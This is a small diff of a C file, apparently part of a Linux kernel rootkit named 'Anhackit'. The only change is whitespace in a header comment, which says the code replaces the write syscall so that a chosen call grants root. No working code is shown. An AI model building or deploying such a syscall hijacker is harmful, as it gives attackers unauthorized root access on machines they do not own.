@@ -4,7 +4,7 @@
 #include <linux/cred.h>
 
 /*
-	Anhackit write sys call hijacker - Developed by Anhackin
+    Anhackit write sys call hijacker - Developed by Anhackin
 
     Call hijack_write_sys_call to replace the original write sys call
     with the hijacked_sys_write that will make us root when we make
